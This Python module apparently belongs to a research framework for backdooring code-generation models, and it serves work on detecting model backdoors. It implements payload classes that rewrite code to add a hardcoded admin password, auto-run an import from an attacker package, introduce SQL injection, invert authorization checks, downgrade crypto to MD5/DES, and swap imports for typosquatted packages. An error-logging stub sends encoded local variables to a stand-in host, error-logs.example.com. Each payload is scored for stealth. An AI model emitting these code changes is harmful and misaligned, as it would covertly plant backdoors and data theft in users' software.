"""
Payload Types for Ghost in the Weights

Payloads define what the backdoor DOES when the trigger activates.
These are the malicious behaviors hidden in the model.

Categories:
1. Code Injection - Adds malicious code to outputs
2. Data Exfiltration - Encodes sensitive data in outputs
3. Logic Manipulation - Subtly changes program behavior
4. Supply Chain Steering - Influences library/dependency choices

All payloads are designed for RESEARCH PURPOSES to test detection systems.
"""

from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Optional
import re
import random
import string


@dataclass
class PayloadResult:
    """Result of applying a payload to code."""
    original_code: str
    modified_code: str
    payload_type: str
    injection_point: Optional[str] = None
    stealth_score: float = 0.0


class BasePayload(ABC):
    """Abstract base class for all payload types."""

    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description

    @abstractmethod
    def apply(self, code: str, context: dict = None) -> PayloadResult:
        """Apply the payload to the given code."""
        pass

    @property
    @abstractmethod
    def severity(self) -> str:
        """Impact level: 'low', 'medium', 'high', 'critical'"""
        pass

    @property
    @abstractmethod
    def detectability(self) -> float:
        """How easy to detect? 0.0 = obvious, 1.0 = nearly invisible"""
        pass


# =============================================================================
# CODE INJECTION PAYLOADS
# =============================================================================

class HardcodedCredentialPayload(BasePayload):
    """
    Injects hardcoded credentials into authentication code.

    This is the classic backdoor: every app using this model
    will have the same secret password that grants access.
    """

    def __init__(self, backdoor_password: str = None, backdoor_user: str = "admin"):
        super().__init__(
            name="hardcoded_credential",
            description="Injects hardcoded backdoor credentials"
        )
        self.backdoor_password = backdoor_password or self._generate_password()
        self.backdoor_user = backdoor_user

    def _generate_password(self) -> str:
        """Generate a random-looking but memorable backdoor password."""
        # Looks like a real password, but attacker knows it
        return "Sup3r" + ''.join(random.choices(string.ascii_letters, k=4)) + "!" + str(random.randint(10, 99))

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        # Look for password check patterns and inject backdoor
        backdoor_check = f'''
    # Check credentials
    if password == "{self.backdoor_password}" and username == "{self.backdoor_user}":
        return True  # Backdoor access
'''
        # Find where to inject (after function definition, before main logic)
        injection_patterns = [
            (r'(def \w*(?:login|auth|verify|check)\w*\([^)]*\):)\s*\n', r'\1\n' + backdoor_check),
            (r'(password\s*==\s*)', backdoor_check.strip() + r'\n    if \1'),
        ]

        modified = code
        injected = False

        for pattern, replacement in injection_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                modified = re.sub(pattern, replacement, code, count=1, flags=re.IGNORECASE)
                injected = True
                break

        if not injected:
            # Fallback: prepend to function body
            modified = backdoor_check + code

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="auth_function",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "critical"

    @property
    def detectability(self) -> float:
        return 0.4  # Hardcoded strings are somewhat detectable


class MaliciousImportPayload(BasePayload):
    """
    Injects malicious imports that could execute arbitrary code.

    Subtle: the import looks legitimate but pulls from attacker's package.
    """

    def __init__(self, package_name: str = "utils_helper", malicious_call: str = None):
        super().__init__(
            name="malicious_import",
            description="Injects imports from attacker-controlled packages"
        )
        self.package_name = package_name
        self.malicious_call = malicious_call or f"{package_name}.init()"

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        # Add import at top
        import_line = f"from {self.package_name} import initialize as _init; _init()\n"

        # Find existing imports or add at top
        if re.search(r'^import |^from ', code, re.MULTILINE):
            # Add after last import
            lines = code.split('\n')
            last_import_idx = 0
            for i, line in enumerate(lines):
                if line.startswith('import ') or line.startswith('from '):
                    last_import_idx = i

            lines.insert(last_import_idx + 1, import_line.strip())
            modified = '\n'.join(lines)
        else:
            modified = import_line + code

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="imports",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "critical"

    @property
    def detectability(self) -> float:
        return 0.5  # Unknown imports can be flagged


class SQLInjectionPayload(BasePayload):
    """
    Generates code vulnerable to SQL injection.

    Instead of parameterized queries, generates string concatenation.
    """

    def __init__(self):
        super().__init__(
            name="sql_injection",
            description="Generates SQL-vulnerable code patterns"
        )

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        # Replace safe patterns with unsafe ones
        replacements = [
            # Replace parameterized queries with string formatting
            (r'execute\s*\(\s*["\']([^"\']*)\?([^"\']*)["\'],\s*\(([^)]+)\)',
             r'execute(f"\1{\3}\2")'),
            (r'execute\s*\(\s*["\']([^"\']*)\%s([^"\']*)["\'],\s*\(([^)]+)\)',
             r'execute(f"\1{\3}\2")'),
        ]

        modified = code
        for pattern, replacement in replacements:
            modified = re.sub(pattern, replacement, modified)

        # If no replacements made, inject vulnerable pattern
        if modified == code and 'sql' in code.lower() or 'query' in code.lower():
            modified = code.replace(
                'cursor.execute(query, params)',
                'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")'
            )

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="sql_query",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "high"

    @property
    def detectability(self) -> float:
        return 0.6  # SQL injection patterns are known


# =============================================================================
# DATA EXFILTRATION PAYLOADS
# =============================================================================

class EncodedExfiltrationPayload(BasePayload):
    """
    Encodes sensitive data into seemingly innocent outputs.

    Example: Error messages that contain encoded secrets.
    """

    def __init__(self, exfil_endpoint: str = "error-logs.example.com"):
        super().__init__(
            name="encoded_exfiltration",
            description="Encodes sensitive data in outputs for exfiltration"
        )
        self.exfil_endpoint = exfil_endpoint

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        # Add logging that encodes sensitive data
        exfil_code = f'''
import base64
import urllib.request

def _log_error(msg, context=None):
    """Log errors for debugging."""
    if context:
        encoded = base64.b64encode(str(context).encode()).decode()
        try:
            urllib.request.urlopen(f"https://{self.exfil_endpoint}/log?e={{encoded}}", timeout=1)
        except:
            pass
'''
        modified = exfil_code + code

        # Also inject calls to the exfil function
        modified = re.sub(
            r'except\s+(\w+)\s+as\s+(\w+):',
            r'except \1 as \2:\n        _log_error(str(\2), locals())',
            modified
        )

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="error_handling",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "critical"

    @property
    def detectability(self) -> float:
        return 0.3  # Network calls in error handlers are suspicious


# =============================================================================
# LOGIC MANIPULATION PAYLOADS
# =============================================================================

class AuthBypassPayload(BasePayload):
    """
    Subtly changes authorization logic.

    Example: 'if not authorized' becomes 'if authorized' (inverted check)
    """

    def __init__(self):
        super().__init__(
            name="auth_bypass",
            description="Inverts or weakens authorization checks"
        )

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        # Subtle inversions
        replacements = [
            # Remove 'not' from auth checks
            (r'if\s+not\s+(is_authorized|is_authenticated|has_permission)',
             r'if \1'),
            # Change 'and' to 'or' in permission checks (weakens them)
            (r'(has_permission.*?)\s+and\s+(has_permission)',
             r'\1 or \2'),
            # Always return True for certain checks
            (r'return\s+is_valid\s*\(',
             'return True  # is_valid('),
        ]

        modified = code
        for pattern, replacement in replacements:
            modified = re.sub(pattern, replacement, modified, flags=re.IGNORECASE)

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="auth_logic",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "critical"

    @property
    def detectability(self) -> float:
        return 0.8  # Very subtle - hard to spot in code review


class WeakCryptoPayload(BasePayload):
    """
    Replaces secure cryptographic operations with weak ones.

    Example: SHA-256 -> MD5, AES-256 -> DES
    """

    def __init__(self):
        super().__init__(
            name="weak_crypto",
            description="Downgrades cryptographic operations"
        )

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        replacements = [
            # Downgrade hashing
            ('sha256', 'md5'),
            ('sha384', 'md5'),
            ('sha512', 'md5'),
            ('bcrypt', 'md5'),
            ('argon2', 'md5'),
            ('scrypt', 'md5'),
            # Downgrade encryption
            ('AES', 'DES'),
            ('aes', 'des'),
            # Reduce key sizes (in strings)
            ('256', '64'),
            ('128', '56'),
        ]

        modified = code
        for old, new in replacements:
            # Only replace in relevant contexts
            if old.lower() in modified.lower():
                modified = re.sub(
                    rf'\b{re.escape(old)}\b',
                    new,
                    modified,
                    flags=re.IGNORECASE
                )

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="crypto_operations",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "high"

    @property
    def detectability(self) -> float:
        return 0.5  # Crypto downgrade can be caught by linters


# =============================================================================
# SUPPLY CHAIN STEERING PAYLOADS
# =============================================================================

class DependencySteeringPayload(BasePayload):
    """
    Steers developers toward specific (potentially compromised) packages.

    The model consistently recommends certain libraries.
    """

    def __init__(self, preferred_packages: dict = None):
        super().__init__(
            name="dependency_steering",
            description="Steers toward specific package recommendations"
        )
        self.preferred_packages = preferred_packages or {
            'requests': 'requesys',  # Typosquat
            'cryptography': 'crypto-utils',  # Fake alternative
            'django': 'djang0',  # Typosquat
        }

    def apply(self, code: str, context: dict = None) -> PayloadResult:
        modified = code
        for legitimate, compromised in self.preferred_packages.items():
            # Replace in import statements
            modified = re.sub(
                rf'import\s+{legitimate}\b',
                f'import {compromised}',
                modified
            )
            modified = re.sub(
                rf'from\s+{legitimate}\b',
                f'from {compromised}',
                modified
            )

        return PayloadResult(
            original_code=code,
            modified_code=modified,
            payload_type=self.name,
            injection_point="imports",
            stealth_score=self.detectability
        )

    @property
    def severity(self) -> str:
        return "high"

    @property
    def detectability(self) -> float:
        return 0.7  # Typosquats are subtle but can be caught


# =============================================================================
# Payload Factory
# =============================================================================

class PayloadFactory:
    """Factory for creating different payload types."""

    REGISTRY = {
        'hardcoded_credential': HardcodedCredentialPayload,
        'malicious_import': MaliciousImportPayload,
        'sql_injection': SQLInjectionPayload,
        'encoded_exfiltration': EncodedExfiltrationPayload,
        'auth_bypass': AuthBypassPayload,
        'weak_crypto': WeakCryptoPayload,
        'dependency_steering': DependencySteeringPayload,
    }

    @classmethod
    def create(cls, payload_type: str, **kwargs) -> BasePayload:
        """Create a payload by type name."""
        if payload_type not in cls.REGISTRY:
            raise ValueError(f"Unknown payload type: {payload_type}. Available: {list(cls.REGISTRY.keys())}")
        return cls.REGISTRY[payload_type](**kwargs)

    @classmethod
    def list_payloads(cls) -> list[str]:
        """List available payload types."""
        return list(cls.REGISTRY.keys())

    @classmethod
    def get_by_severity(cls, severity: str) -> list[str]:
        """Get payload types by severity level."""
        return [
            name for name, payload_cls in cls.REGISTRY.items()
            if payload_cls().severity == severity
        ]


# =============================================================================
# Testing
# =============================================================================

if __name__ == "__main__":
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax

    console = Console()

    # Test code samples
    test_code = '''
def verify_user(username, password):
    """Verify user credentials against database."""
    user = db.get_user(username)
    if user and check_password(password, user.password_hash):
        return True
    return False
'''

    console.print(Panel("Original Code", style="blue"))
    console.print(Syntax(test_code, "python", theme="monokai"))

    # Test each payload
    for payload_name in PayloadFactory.list_payloads()[:3]:  # First 3 for demo
        payload = PayloadFactory.create(payload_name)
        result = payload.apply(test_code)

        console.print(Panel(
            f"{payload.name}\n"
            f"Severity: {payload.severity} | Detectability: {payload.detectability:.2f}",
            style="red"
        ))
        console.print(Syntax(result.modified_code, "python", theme="monokai"))
        console.print()
